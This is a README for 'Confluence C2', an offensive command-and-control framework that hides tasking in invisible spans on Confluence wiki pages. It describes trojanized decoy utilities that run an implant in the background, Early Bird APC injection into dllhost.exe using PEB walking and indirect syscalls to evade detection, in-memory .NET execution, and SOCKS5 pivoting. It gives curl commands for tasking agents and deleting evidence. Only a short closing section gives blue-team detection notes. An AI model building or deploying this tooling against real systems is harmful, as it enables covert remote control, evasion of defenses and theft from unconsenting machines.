# Confluence C2

**Author:** Dhanush Arvind

A command-and-control channel that uses Atlassian Confluence wiki pages as the communication medium. Commands are embedded as hidden spans in a page body; results come back as child comments on the same page. All traffic is legitimate HTTPS to the Confluence REST API.

---

## Architecture

```
Operator                   Confluence REST API              Caller
 (c2_web.py Web GUI                                         (caller.exe
  or c2_operator.py CLI)         |                           or QuickSysInfo.exe
  |                              |                           or EarlyBird DLL inject)
  |-- Update page body -------->|                              |
  |   (hidden span C2:TASK)     |                              |
  |                              |<--- GET page body (poll) ---|
  |                              |     parse hidden spans      |
  |                              |                              | execute
  |                              |<--- POST child comment -----|
  |                              |     (span C2:OUT:...)       |
  |-- GET child comments -------|                              |
```

### Communication Protocol

- **Commands**: Embedded as invisible spans in the page body:
  `<span style="display:none">C2:TASK:task_id:agent_id:base64_encoded_command</span>`
  The `agent_id` field targets a specific agent (`*` for broadcast to all)
- **Output**: Posted as child comments on the same page:
  `<span style="display:none">C2:OUT:task_id:agent_id:base64_encoded_output</span>`
- **Registration**: Child comment with:
  `<span style="display:none">C2:REG:agent_id:base64_encoded_sysinfo</span>`
- **Why not HTML comments?** Confluence Cloud strips `<!-- -->` from storage format. Hidden spans survive the sanitizer and are invisible in rendered view.
- **Auth**: HTTP Basic (`email:api_token`), standard for Confluence Cloud/Server

## Payloads

### Payload 1 — Standalone Beacon (`caller.exe`)

The caller runs directly. No disguise. Registers with Confluence immediately and begins polling for tasks.

### Payload 2 — Trojanized QuickSysInfo (`QuickSysInfo.exe`)

Bundles the caller with a legitimate-looking Windows system information viewer. The user sees a console window displaying hostname, OS version, CPU, memory, and network adapters. The caller runs in a background thread.

### Payload 3 — Early Bird DLL Injection (`earlybird_inject.exe` + `caller_inject.dll`)

Uses APC-based Early Bird injection to load the caller DLL into a suspended `dllhost.exe` process. The standalone binary has a completely empty PE import table — all API resolution is done at runtime via PEB walking and PE export table parsing. NT-level operations (memory allocation, writing, APC queuing, thread resume, handle close) use indirect syscalls through a `syscall; ret` gadget found in ntdll.dll's `.text` section. Kernel32 functions (CreateProcessA, GetFullPathNameA, LoadLibraryA, Sleep) are resolved dynamically from the PEB. Two APCs are queued on the suspended main thread:
1. `LoadLibraryA(caller_inject.dll)` — loads the caller DLL
2. `Sleep(INFINITE)` — keeps dllhost.exe alive (prevents it from exiting)

The DLL's `DllMain` spawns a thread running `c2_main()`. Both files must be in the same directory. Compiled with `-nostdlib -fno-stack-protector -fno-builtin -Wl,-e,_start` (no C runtime, custom entry point).

### Payload 4 — Trojanized QuickProcView (`QuickProcView.exe` + `caller_inject.dll`)

Bundles the Early Bird injector with a legitimate-looking process viewer. The user sees a console listing all running processes (PID, PPID, name, memory). In a background thread, it performs the same PEB walk + indirect syscall injection as Payload 3. The bundled binary links CRT normally (for the process viewer UI) but the injection code itself resolves everything at runtime. Requires `caller_inject.dll` in the same directory.

## Complete Setup Guide (Step by Step)

### Prerequisites

- **Python 3.8+** with `requests`:
  ```
  pip install requests
  ```
- **Confluence Cloud** account with an API token (generate at https://id.atlassian.com/manage-profile/security/api-tokens), or Confluence Server credentials
- **MinGW GCC** — either:
  - WSL with `x86_64-w64-mingw32-gcc` (`sudo apt install gcc-mingw-w64-x86-64`), or
  - Native MinGW-w64 installed on Windows and added to PATH

### Step 1: Create the C2 Page

Use the operator script to create a decoy wiki page in your Confluence space:

```
python c2_operator.py ^
    --url https://yourcompany.atlassian.net ^
    --email you@company.com ^
    --api-token YOUR_API_TOKEN ^
    setup --space-key MYSPACE
```

## Multi-Agent Support and Targeting

Multiple agents can share the same page. Each caller instance registers with a unique agent ID derived from `hostname + username + PID`, so even multiple callers on the same machine get distinct IDs and appear as separate entries in the Agents tab.

### Agent ID

The agent ID is an 8-character hex string computed from `simple_hash(hostname\username\pid)`. Because the PID is included, every caller process gets a unique ID. View all registered agents in the web GUI Agents tab, via `c2_operator.py list`, or by reading the page comments.

### Page-body commands (operator script or web GUI)

Commands sent via `task` are embedded with the target agent ID:
```
C2:TASK:task_id:agent_id:base64_command
```
Only the targeted agent executes the command. Use `*` as agent_id to broadcast to all agents.

### Comment commands (browser, web GUI comment mode, or curl)

Navigate to the C2 page in your browser and post a comment to send commands. No operator script needed.

**Broadcast to all agents:**
```
[cmd] whoami
```

**Target a specific agent by ID:**
```
[cmd:84759585] whoami
```

**Examples with multiple agents:**
```
[cmd:84759585] shell ipconfig /all
[cmd:579c735c] info
[cmd] exit
```

Each agent posts its response as a visible comment prefixed with its ID in brackets, e.g. `[84759585] > DESKTOP-PC\dhanush`.

### Operator script targeting

```
# Target specific agent via page body
python c2_operator.py ... task 84759585 "whoami"

# Target specific agent via comment
python c2_operator.py ... ctask --agent 84759585 "whoami"

# Broadcast via comment
python c2_operator.py ... ctask "whoami"
```

### Web GUI targeting

In the Console tab, select the target agent from the dropdown (or select ALL for broadcast). Works in both Page Body and Comment modes.

## Early Bird Injection — Technical Details

The Early Bird technique (`earlybird_inject.c`) uses PEB walking, PE export parsing, and indirect syscalls to operate with a completely empty import table.

### API Resolution (PEB Walk)

1. Read the PEB address from `GS:0x60` (x64 TEB offset)
2. Follow `PEB->Ldr->InMemoryOrderModuleList` to enumerate loaded DLLs
3. Compare each module's `BaseDllName` (UNICODE_STRING) against `ntdll.dll` and `kernel32.dll`
4. Parse each DLL's PE export directory (walk `AddressOfNames`, `AddressOfNameOrdinals`, `AddressOfFunctions`) to resolve individual function addresses
5. No `GetModuleHandle`, no `GetProcAddress` — everything resolved from raw PEB structures

### Indirect Syscalls

For NT-level operations, the injector extracts the syscall service number (SSN) from each ntdll stub by reading the `mov eax, <imm32>` instruction at offset +3 of the function (after `mov r10, rcx`). It then locates a `syscall; ret` gadget (bytes `0F 05 C3`) inside ntdll's `.text` section. Each syscall stub is a `__attribute__((naked))` function that sets `r10 = rcx`, loads the SSN into `eax`, and jumps to the gadget. The `syscall` instruction executes from within ntdll's address space (indirect), not from the caller binary.

Syscalls used: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtQueueApcThread`, `NtResumeThread`, `NtClose`.

### Injection Flow

1. PEB walk to find ntdll.dll and kernel32.dll base addresses
2. Resolve NT functions from ntdll, extract SSNs, locate `syscall; ret` gadget
3. Resolve `CreateProcessA`, `GetFullPathNameA`, `LoadLibraryA`, `Sleep` from kernel32
4. `CreateProcessA("dllhost.exe", ..., CREATE_SUSPENDED)` — creates a suspended dllhost.exe
5. `NtAllocateVirtualMemory` (indirect syscall) — allocates memory in the target process
6. `NtWriteVirtualMemory` (indirect syscall) — writes the DLL absolute path
7. `NtQueueApcThread(LoadLibraryA, dll_path)` (indirect syscall) — queues DLL load APC
8. `NtQueueApcThread(Sleep, INFINITE)` (indirect syscall) — queues keep-alive APC
9. `NtResumeThread` (indirect syscall) — thread wakes, APCs fire: DLL loads, then sleeps forever
10. `NtClose` (indirect syscall) — closes process and thread handles

### Standalone Binary

Compiled with `-nostdlib -fno-stack-protector -fno-builtin -Wl,-e,_start`. Uses a custom `_start` entry point that resolves `GetStdHandle`, `WriteFile`, and `ExitProcess` from kernel32 via PEB walk for console output. The resulting PE has zero entries in the import table.

### Bundled Version

The bundled version (`earlybird_bundled.c`) includes `earlybird_inject.c` with `BUNDLED_BUILD` defined (suppresses the `_start` entry point) and runs the injection in a background thread while displaying QuickProcView in the foreground. The bundled PE links CRT normally for the process viewer, but the injection code itself uses the same PEB walk + indirect syscall path.

The caller DLL (`caller_dll.c`) does `#include "caller.c"` with `BUNDLED_BUILD` defined. Its `DllMain` creates a thread running `c2_main()`.

## Execute-Assembly (In-Memory .NET Execution)

Load and run .NET assemblies in-memory on the target without dropping the assembly to disk.

### Via operator script

```
python c2_operator.py ... --page-id 12345678 inlineexecute <agent_id> <path_to_assembly.exe> [args]
```

The operator reads the assembly file, base64-encodes it, and sends it as an `execute-assembly` command via the page body.

### How it works

1. Caller receives `execute-assembly <base64_assembly> [args]`
2. Writes a temporary PowerShell loader script that calls `[Reflection.Assembly]::Load($bytes)`
3. Invokes the assembly's entry point with optional arguments
4. Captures stdout and returns output
5. Deletes the temp .ps1 file

### Limitations

- Requires PowerShell on the target (present by default on Windows)
- The .ps1 loader script briefly touches disk (deleted immediately after execution)
- Large assemblies (>200KB base64) may exceed Confluence page body limits

## SOCKS5 Proxy (Network Pivoting)

The caller includes a built-in SOCKS5 proxy server for tunneling network traffic through the target machine. This enables pivoting into the target's internal network from the operator's machine.

### Usage

```
# Start the SOCKS5 proxy on a local port on the target
socks start 9050

# Check proxy status and active connection count
socks status

# Stop the proxy
socks stop
```

### How it works

1. The `socks start <port>` command spawns a SOCKS5 server thread listening on `127.0.0.1:<port>` on the target machine
2. The server accepts SOCKS5 connections with no-authentication (method 0x00)
3. Supports CONNECT (0x01) to IPv4 addresses and domain names
4. Each accepted connection spawns a relay thread that proxies TCP data between the SOCKS client and the destination
5. `socks status` reports whether the proxy is running and how many connections are active
6. `socks stop` signals all relay threads to exit and shuts down the listener

### Connecting through the proxy

Since the SOCKS5 server runs on the target's loopback (127.0.0.1), you need a way to reach it from the operator machine. Options:

- **Port forwarding**: If you have another channel (SSH, RDP), forward the SOCKS port
- **Reverse port forward**: Combine with a reverse tunnel to expose the target's SOCKS port locally
- **Local testing**: When testing on the same machine, connect directly to 127.0.0.1:\<port\>

Example with `curl` through the SOCKS5 proxy (local testing):
```bash
curl --socks5 127.0.0.1:9050 http://internal-host:8080/
```

Example with `proxychains` (Linux):
```bash
# Add to /etc/proxychains.conf:
# socks5 127.0.0.1 9050
proxychains nmap -sT -Pn 10.0.0.0/24
```

### Limitations

- Binds to loopback only (127.0.0.1) — requires port forwarding to reach from a remote operator
- SOCKS5 CONNECT only (no BIND or UDP ASSOCIATE)
- No authentication on the SOCKS5 server
- One SOCKS proxy instance at a time per agent

## Browser Comment Interface

The browser comment interface supports full agent targeting and most commands. Navigate to the C2 page in any browser, post a comment, and wait for the response.

### Supported

- **Targeting**: `[cmd:AGENTID] command` targets one specific agent; `[cmd] command` broadcasts to all
- **All built-in commands**: whoami, pwd, ls, cd, shell, info, help, ps, ipconfig, netstat, download, socks start/stop/status, exit
- **Visible output**: Agents reply with visible comments showing `[AGENTID] > output`

### Not supported via browser comments

- **execute-assembly**: Assembly base64 payloads can be 100KB+, far exceeding the ~32KB Confluence comment size limit. Use the operator script or web GUI for execute-assembly.
- **Binary file upload**: Browser comments are text only.

For execute-assembly and automated polling, use `c2_operator.py` or `c2_web.py`.

## Operating Without the Operator Script (curl / Confluence REST API)

You can operate entirely with `curl` against the Confluence REST API.

### Variables

```bash
BASE="https://mycompany.atlassian.net/wiki/rest/api"   # Cloud (has /wiki)
# BASE="https://confluence.internal/rest/api"            # Server (no /wiki)
AUTH="user@company.com:ATATT3xFfGF0..."                 # email:api_token
PAGE_ID="12345678"
```

### Send a Command

```bash
PAGE=$(curl -s -u "$AUTH" "$BASE/content/$PAGE_ID?expand=body.storage,version")
VERSION=$(echo "$PAGE" | python -c "import sys,json; print(json.load(sys.stdin)['version']['number'])")
TITLE=$(echo "$PAGE" | python -c "import sys,json; print(json.load(sys.stdin)['title'])")
BODY=$(echo "$PAGE" | python -c "import sys,json; print(json.load(sys.stdin)['body']['storage']['value'])")
TASK_ID="t001"
CMD_B64=$(echo -n "whoami" | base64)
NEW_VERSION=$((VERSION + 1))
curl -s -u "$AUTH" -X PUT "$BASE/content/$PAGE_ID" \
    -H "Content-Type: application/json" \
    -d "{
        \"version\": {\"number\": $NEW_VERSION},
        \"title\": \"$TITLE\",
        \"type\": \"page\",
        \"body\": {\"storage\": {
            \"value\": \"$BODY<p><span style=\\\"display:none\\\">C2:TASK:$TASK_ID:$CMD_B64</span></p>\",
            \"representation\": \"storage\"
        }}
    }"
```

### Read Output

```bash
curl -s -u "$AUTH" "$BASE/content/$PAGE_ID/child/comment?expand=body.storage" | \
    python -c "
import sys, json, base64
data = json.load(sys.stdin)
for c in data.get('results', []):
    body = c['body']['storage']['value']
    if '>C2:OUT:' in body:
        start = body.index('>C2:OUT:') + 8
        end = body.index('</span>', start)
        parts = body[start:end].split(':', 2)
        if len(parts) >= 3:
            print(f'[task={parts[0]} agent={parts[1]}]')
            print(base64.b64decode(parts[2]).decode())
"
```

### Clean Up

```bash
curl -s -u "$AUTH" "$BASE/content/$PAGE_ID/child/comment" | \
    python -c "
import sys, json
data = json.load(sys.stdin)
for c in data.get('results', []):
    body = c.get('body',{}).get('storage',{}).get('value','')
    if '>C2:REG:' in body or '>C2:OUT:' in body or '[cmd' in body:
        print(c['id'])
" | while read CID; do
    curl -s -u "$AUTH" -X DELETE "$BASE/content/$CID"
    echo "Deleted comment $CID"
done
```

## Detection Notes

For blue-team defenders testing detection capabilities:

- **Network**: HTTPS traffic to `*.atlassian.net` or your Confluence server. Periodic GET to the same page ID + frequent comment POST calls.
- **Page forensics**: Hidden spans (`<span style="display:none">C2:TASK:...</span>`) are invisible in rendered view but visible in storage format via REST API.
- **Comment volume**: Unusual volume of child comments on a single page with hidden span markers.
- **Auth**: Basic auth with API token. Monitor Confluence audit logs for API access patterns from unusual IPs.
- **Host (Payloads 1-2)**: Caller links `winhttp.dll`, spawns `cmd.exe` for shell commands. Execute-assembly creates a temporary `.ps1` file and invokes `powershell.exe`. SOCKS proxy opens a listening socket on loopback.
- **Host (Payloads 3-4)**: `dllhost.exe` spawned with `CREATE_SUSPENDED`, DLL loaded via `NtQueueApcThread` (indirect syscall). The standalone `earlybird_inject.exe` has an empty PE import table (all APIs resolved via PEB walk) and uses indirect syscalls through ntdll's own `syscall; ret` gadget. The dllhost.exe process will have `caller_inject.dll` loaded and an unusually long-lived main thread sleeping indefinitely. The process has no COM activation — a dllhost.exe with no `/Processid:` COM class registered is anomalous.
- **Web GUI**: The operator web server listens on a configurable port (default 8443). No external network indicators beyond the Confluence API calls.

---

## Limitations

- Sleep interval is compile-time (no dynamic jitter)
- Page body grows with each command (markers accumulate until cleanup)
- Output size limited by Confluence comment size limits (~32KB)
- File download limited to ~30KB (base64 in comment body)
- Single page ID per caller build
- Early Bird payloads require `caller_inject.dll` in the same directory as the injector executable
